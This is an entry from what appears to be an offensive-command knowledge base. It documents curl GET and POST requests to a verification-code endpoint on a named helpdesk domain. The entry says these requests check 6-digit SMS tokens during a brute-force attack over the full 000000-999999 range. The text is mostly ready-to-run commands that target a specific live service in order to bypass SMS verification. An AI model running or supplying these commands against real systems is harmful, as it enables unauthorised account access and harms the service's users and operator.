---
data: 'curl -X GET https://helpdesk.bistudio.com/api/system/verification-codes/123456'
tags:
  - bruteforce
  - token-verification
type: command
executor: bash
platforms:
  - Web
id: 67eb3b5f-dc92-4544-9e42-5c14bf0a773b
created_at: '2025-12-14T17:33:12.388Z'
updated_at: '2025-12-14T17:33:12.388Z'
verified: false
validated: true
submitted: true
---
# get-post-verify-token

## Command

```bash
curl -X GET https://helpdesk.bistudio.com/api/system/verification-codes/123456
```

## Description

Verifies a 6-digit SMS token against the API; use GET or POST for checking during bruteforce.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{token}` | 6-digit code (000000-999999) | Yes |

## Examples

### Basic Usage

```bash
curl -X GET https://helpdesk.bistudio.com/api/system/verification-codes/123456
```

### Advanced Usage (POST)

```bash
curl -X POST https://helpdesk.bistudio.com/api/system/verification-codes/123456 -H "Content-Type: application/json" -d '{}'
```

## Expected Output

Success (200 OK) if valid token; error otherwise.

## Related

- [[Related Procedure]]
